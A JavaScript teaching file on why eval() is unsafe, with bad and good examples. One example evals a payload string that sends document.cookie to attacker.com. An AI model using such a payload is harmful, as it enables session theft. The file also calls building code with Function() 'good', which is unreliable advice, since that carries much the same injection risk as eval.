// Never use eval() on a string; it opens too many vulnerabilities. eslint:

// Why should you never use eval()?

// Security Risk (Code Injection)
// Executes arbitrary code from a string.
// If the string is user-controlled, attackers can run malicious code.
// Performance Hit
// eval() forces the JavaScript engine to recompile code at runtime, disabling many optimizations.

// Debugging Difficulty
// Code inside eval() is harder to trace, lint, or debug.

// Breaks Scope Control
// Can access and modify variables outside its intended scope

{
  // bad
  const expression = "2 + 2";
  const result = eval(expression); // ❌
  console.log("result:", result);
}

{
  // Vulnerable Code Example
  // Simulated search feature where user can type filters
  const userInput =
    "document.location='https://attacker.com/steal?c='+document.cookie";

  // BAD: directly using eval with user input
  eval(userInput); // ❌ Executes malicious code
}

// If this runs in a browser, an attacker could craft a link that makes your app execute this code.
// Result? Your cookies (session tokens, authentication keys) get sent to their server.

{
  //good
  const expression = "2 + 2";
  const result = Function('"use strict"; return (' + expression + ")")();
  console.log("result:", result);
}

{
  //best if you only need JSON parsing:

  const json = '{"name": "Alice"}';
  const data = JSON.parse(json); // ✅ Safe alternative to eval(json)
  console.log("data:", data);
}
